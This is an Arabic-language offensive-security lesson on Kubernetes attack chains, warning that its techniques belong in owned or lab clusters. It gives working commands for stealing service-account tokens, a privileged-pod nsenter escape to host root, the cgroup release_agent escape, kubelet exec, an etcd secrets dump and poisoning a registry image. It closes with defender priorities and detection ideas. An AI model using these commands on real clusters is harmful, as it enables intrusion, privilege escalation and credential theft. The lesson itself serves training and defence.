# سلاسل هجوم Kubernetes (Kubernetes Attack Chains)

تعد منصات التطبيقات الحديثة بمثابة خزائن للاعتمادات ومخازن للأسرار، كما تمثل طريقاً سريعاً للوصول إلى كافة أعباء العمل الأخرى داخل العنقود (Cluster). يهدف هذا الدرس إلى رسم مسار المهاجم بدءاً من القدرة على تشغيل حاوية (Pod) وصولاً إلى السيطرة الكاملة على "مستوى التحكم" (Control Plane)، مع تسليط الضوء على نقاط الاختناق التي يجب على المدافعين تحصينها أولاً.

> [!warning] التأثير على العنقود
> يجب تنفيذ هذه التقنيات فقط على العناقيد التي تملكها أو في بيئات المختبرات مثل KubeGoat أو Kubernetes Goat. تذكر أن أي تغيير غير صحيح في صلاحيات RBAC داخل عنقود مشترك قد يؤدي إلى تعطيل بيئة الإنتاج للجميع.

## نموذج التهديد (Threat Model)

![بيئة هجوم كوبرنيتيس](/images/lessons/kubernetes_attack_surface_en.png)

توجد خمس نقاط دخول رئيسية: تسريب ملفات kubeconfig، واجهات البرمجيات (API) أو لوحات التحكم المكشوفة، أعباء العمل الضعيفة، الـ kubelet غير المؤمن، وصور الحاويات المفخخة في سلسلة التوريد.

## 1. الاستطلاع (Reconnaissance) — ما هو سطح الهجوم المكشوف؟

```terminal
# البحث عن واجهات برمجة تطبيقات Kubernetes المكشوفة
shodan search 'product:"Kubernetes"'
shodan search 'http.title:"Kubernetes Dashboard"'
fofa.info 'app="kubernetes" && country="XX"'

# بمجرد الحصول على عنوان IP:
kubectl --insecure-skip-tls-verify --server=https://API:6443 get nodes
# إذا كانت المصادقة المجهولة (Anonymous-Auth) مفعلة، يمكنك قراءة كافة البيانات
kubectl --insecure-skip-tls-verify --server=https://API:6443 auth can-i --list
```

## 2. من اختراق الحاوية إلى العنقود (Pod RCE → Cluster)

عند نجاحك في اختراق حاوية (Pod) عبر ثغرة على مستوى التطبيق (مثل SSRF أو Deserialization)، تبدأ مرحلة التقصي الداخلي:

```terminal
# داخل الحاوية (Pod)
ls /var/run/secrets/kubernetes.io/serviceaccount/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# ما هي صلاحيات حساب الخدمة (SA) الحالي؟
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -X POST -H 'Content-Type: application/json' \
  -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}"
```

## 3. إساءة استخدام RBAC — مسارات تصعيد الصلاحيات

بعض صلاحيات RBAC تعادل الحصول على صلاحيات الجذر (Root) في العنقود:

| الصلاحية (Verb) | لماذا تعادل صلاحية المسؤول (Admin)؟ |
|------------------|---------------------|
| `create pods` (في أي Namespace) | تتيح تحميل نظام ملفات المضيف والهروب إلى النود (Node) |
| `create pods/exec` | تتيح الدخول إلى أي حاوية موجودة وسرقة الاعتمادات |
| `get/list secrets` | تتيح قراءة رموز (Tokens) حسابات الخدمة، بما فيها حساب المسؤول |
| `escalate clusterroles` | تتيح منح نفسك أي صلاحيات إضافية |
| `bind / clusterrolebinding` | تتيح ربط دور Cluster-Admin بهويتك الحالية |
| `impersonate users/groups` | تتيح تقمص شخصية أي مستخدم بما في ذلك `system:masters` |
| `patch nodes` | تتيح تعديل وسوم النود للتهرب من القيود أو تغيير جدولة المهام |

```terminal
# تصعيد الصلاحيات عبر 'create pods' (تحميل نظام ملفات النود)
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata: { name: pwn, namespace: default }
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    command: ["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","sh"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: host, mountPath: /host }]
  volumes: [{ name: host, hostPath: { path: / } }]
EOF
kubectl exec -it pwn -- sh
# أنت الآن تعمل كجذر (Root) على النود المضيف.
```

## 4. تقنيات الهروب من الحاويات (Pod Escape Primitives)

حتى في حال حظر `privileged: true` عبر السياسات الأمنية، فإن بعض أخطاء التكوين تظل كافية للهروب:

| خطأ التكوين | تقنية الهروب |
|-----------|------------------|
| `hostPID: true` | استخدام `nsenter` للوصول إلى PID 1 عند توفر `CAP_SYS_PTRACE` |
| `hostNetwork: true` | التواصل مع الـ kubelet على `127.0.0.1:10250` أو IMDS في السحابة |
| تحميل `hostPath: /` | الكتابة في `/etc/cron.d/` أو زرع مفتاح SSH في `/root/.ssh/` |
| `CAP_SYS_ADMIN` | تحميل cgroup `release_agent` لتنفيذ أوامر كجذر على المضيف |
| تحميل مقبس Docker (Socket) | استخدام `docker run --privileged` لإنشاء حاوية بصلاحيات كاملة |
| RunAsUser 0 + غياب AppArmor | استغلال سلاسل تصعيد الصلاحيات (LPE) في النواة |

### الهروب عبر release_agent (لا يزال فعالاً في العديد من العناقيد)

```terminal
# داخل حاوية تملك صلاحية CAP_SYS_ADMIN
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
HOST_PATH=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$HOST_PATH/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo 'id > /tmp/host_id' >> /cmd && chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /tmp/host_id
```

## 5. الـ Kubelet غير المؤمن (منفذ 10250)

إذا تم ضبط `--anonymous-auth=true` و `--authorization-mode=AlwaysAllow` في إعدادات Kubelet، فإنه سيسمح بتنفيذ الأوامر (Exec) على أي حاوية في النود التابع له:

```terminal
curl -sk https://NODE:10250/pods | jq '.items[].metadata.name'
# تنفيذ أمر في أي حاوية:
curl -sk -X POST 'https://NODE:10250/run/<ns>/<pod>/<container>?cmd=id'
```

## 6. استخراج بيانات etcd

إذا تمكنت من الوصول إلى منفذ etcd (2379) دون الحاجة لمصادقة الشهادات (Client-cert Auth)، يمكنك قراءة **كل أسرار العنقود**، بما في ذلك ملفات kubeconfig الخاصة بالمسؤولين وجميع رموز حسابات الخدمة.

```terminal
ETCDCTL_API=3 etcdctl --endpoints=https://etcd-host:2379 \
  --cacert=ca.crt --cert=apiserver.crt --key=apiserver.key \
  get / --prefix --keys-only | head
ETCDCTL_API=3 etcdctl ... get /registry/secrets/kube-system/admin-key
```

> [!danger] الوصول إلى etcd يعني السيطرة الكاملة
> تعد النسخ الاحتياطية لـ etcd المخزنة في حاويات S3 دون تشفير من أكثر الثغرات تكراراً. يجب معاملة ملفات etcd بنفس مستوى السرية الذي تعامل به ملفات NTDS.dit في بيئات Active Directory.

## 7. مخاطر سلسلة التوريد — سجلات الصور

```terminal
# البحث عن سجلات الصور (Registries) المكشوفة
shodan search 'product:"Docker Registry" "/v2/"'

# سحب صورة خاصة دون مصادقة (في حال وجود خطأ تكوين)
curl https://registry.target/v2/_catalog
curl https://registry.target/v2/<image>/manifests/latest -H "Accept: application/vnd.docker.distribution.manifest.v2+json"

# حقن طبقة خبيثة أو استخدام تقنية Typosquatting للوسوم (Tags)
docker tag pwn:latest registry.target/library/nginx:1.25.3-alpine
docker push registry.target/library/nginx:1.25.3-alpine
```

## سيناريو اختراق كامل (Purple-Team Scenario)

```terminal
# 1. اكتشاف لوحة تحكم مكشوفة (قراءة مجهولة لنقطة /metrics)
curl https://target/metrics | grep kube_pod_info | head

# 2. العثور على حاوية (Pod) تشغل تطبيقاً ضعيفاً واختراقها عبر SSRF
curl 'https://target/api?url=http://app/internal'

# 3. من الداخل، تعداد صلاحيات SA؛ تبين وجود صلاحية create pods (دور default-edit)
# 4. إنشاء حاوية ذات صلاحيات (Privileged Pod) تقوم بتحميل نظام ملفات المضيف /
# 5. استخدام nsenter للوصول للمضيف واستخراج اعتمادات Kubelet
# 6. استخدام اعتمادات Kubelet لتنفيذ exec على حاوية apiserver واستخراج ملف --token-auth-file
# 7. باستخدام رمز Cluster-Admin، استخراج بيانات etcd → الحصول على كافة الأسرار واعتمادات السحابة
# 8. التحرك الجانبي نحو السحابة (عبر IRSA / Workload Identity)
```

## أولويات الدفاع (Defender Priorities)

1. **تعطيل المصادقة المجهولة** على مستوى الـ apiserver والـ kubelet عبر ضبط `--anonymous-auth=false`.
2. **تفعيل PodSecurityAdmission بنمط `restricted`** على كافة نطاقات الأسماء (Namespaces)؛ وحظر الـ `privileged` والـ `hostPath` وغيرها.
3. **فرض سياسات الشبكة (Network Policies)** بنمط "رفض الكل" (Default-Deny) بين نطاقات الأسماء؛ لمنع التحرك الجانبي.
4. **تشفير الأسرار أثناء السكون (At Rest)** باستخدام مزود KMS وتدويرها بانتظام.
5. **إدارة الصور**: التحقق من التواقيع الرقمية (Cosign / Sigstore) وحظر استخدام الوسم `latest`.
6. **مراجعة RBAC دورياً**: البحث عن صلاحيات مثل `escalate` و `bind` و `impersonate`.
7. **إرسال سجلات التدقيق (Audit Logs) إلى SIEM**: والتنبيه عند رصد عمليات `pods/exec` أو `secrets/get` خارج النطاق المعتاد.

## أفكار للرصد والتقصي النشط

| مصدر البيانات | مؤشر الاختراق (Detection) |
|-----------|-----------|
| سجلات `pods/exec` | أي تنفيذ أوامر من قبل مستخدم بشري في بيئة الإنتاج |
| طلبات GET مجهولة للأسرار | محاولات استطلاع نشطة |
| إنشاء Pod مع `hostPath: /` | تنبيه حرج جداً — نشاط تخريبي مؤكد غالباً |
| تواصل مع Kubelet 10250 من خارج مستوى التحكم | محاولة تحرك جانبي (Lateral Movement) |
| ارتفاع زمن استجابة etcd مع قراءات ضخمة | احتمال وجود عملية استخراج بيانات (Dump) |
